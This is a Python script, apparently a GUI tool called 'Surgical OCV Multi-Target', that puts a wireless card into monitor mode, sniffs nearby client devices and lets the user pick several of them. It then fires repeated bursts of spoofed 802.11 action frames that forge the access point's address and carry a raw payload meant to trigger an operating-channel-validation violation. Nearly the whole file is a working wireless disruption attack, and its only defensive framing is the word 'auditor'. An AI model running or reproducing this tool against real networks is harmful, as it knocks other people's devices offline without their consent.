import os, sys, time, threading
from scapy.all import *
import tkinter as tk

class SurgicalAuditorMulti:
    def __init__(self, iface):
        self.iface = iface
        self.discovered = {}
        self.running = True
        self.firing = False
        self.ch = 1
        
        # Lock down hardware to stop the Managed Mode flip
        self.lock_hardware()
        
        self.root = tk.Tk()
        self.root.title("Surgical OCV Multi-Target v5.2")
        self.root.geometry("950x750")
        self.root.configure(bg="#050505")

        tk.Label(self.root, text="MULTI-TARGET OCV AUDITOR", fg="#00FF41", bg="#050505", font=("Courier", 14, "bold")).pack(pady=10)
        
        # Extended selection mode for multiple targets
        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", selectmode="multiple", font=("Courier", 10), height=18)
        self.listbox.pack(padx=20, pady=10, fill="both", expand=True)

        self.btn_text = tk.StringVar(value="ENGAGE MULTI-LOOP")
        tk.Button(self.root, textvariable=self.btn_text, command=self.toggle_attack, bg="#aa5500", fg="white", height=2, width=30).pack(pady=5)
        
        tk.Button(self.root, text="REPAIR & EXIT", command=self.shutdown, bg="#333", fg="red").pack(pady=10)

        threading.Thread(target=self.hopper, daemon=True).start()
        threading.Thread(target=self.scanner, daemon=True).start()

    def lock_hardware(self):
        # Kill NetworkManager ("the fucker") to prevent mode resets
        os.system("sudo airmon-ng check kill > /dev/null 2>&1")
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type monitor")
        os.system(f"sudo ip link set {self.iface} up")

    def hopper(self):
        ch = 1
        while self.running:
            if not self.firing:
                os.system(f"sudo iw dev {self.iface} set channel {ch}")
                self.ch = ch
                ch = (ch % 13) + 1
                time.sleep(0.5)
            else:
                time.sleep(1)

    def scanner(self):
        def callback(pkt):
            if not self.firing and pkt.haslayer(Dot11) and pkt.addr2 and pkt.addr3:
                if pkt.addr2 != pkt.addr3 and pkt.addr2 not in self.discovered:
                    self.discovered[pkt.addr2] = {"BSSID": pkt.addr3, "CH": self.ch}
                    self.root.after(0, self.update_ui)
        sniff(iface=self.iface, prn=callback, store=0)

    def update_ui(self):
        self.listbox.delete(0, tk.END)
        for mac, info in self.discovered.items():
            self.listbox.insert(tk.END, f"TARGET: {mac} | AP: {info['BSSID']} | CH: {info['CH']}")

    def toggle_attack(self):
        if not self.firing:
            sel = self.listbox.curselection()
            if not sel: return
            self.firing = True
            self.btn_text.set("STOPPING MULTI-LOOP...")
            threading.Thread(target=self.multi_fire_loop, args=(sel,), daemon=True).start()
        else:
            self.firing = False
            self.btn_text.set("ENGAGE MULTI-LOOP")

    def multi_fire_loop(self, indices):
        # Logic: Extract all selected targets
        targets = []
        macs = list(self.discovered.keys())
        for i in indices:
            targets.append((macs[i], self.discovered[macs[i]]))

        while self.firing:
            for mac, info in targets:
                if not self.firing: break
                
                # Logic: Switch channel to target's location
                os.system(f"sudo iw dev {self.iface} set channel {info['CH']}")
                
                # Manual Hex Logic for OCV Violation
                base = RadioTap()/Dot11(addr1=mac, addr2=info['BSSID'], addr3=info['BSSID'])
                pkt = base/Dot11Action()/Raw(load=b"\x0a\x04\xff\x0a\x01\x01")
                
                try:
                    # Fire a burst at this target, then move to the next
                    sendp(pkt, iface=self.iface, count=15, inter=0.01, verbose=False)
                except:
                    self.firing = False
                    break
            time.sleep(0.05) # Prevent card firmware overflow

    def shutdown(self):
        self.running = False
        self.firing = False
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type managed && sudo ip link set {self.iface} up")
        os.system("sudo systemctl restart NetworkManager")
        self.root.destroy()

if __name__ == "__main__":
    SurgicalAuditorMulti(sys.argv[1]).root.mainloop()
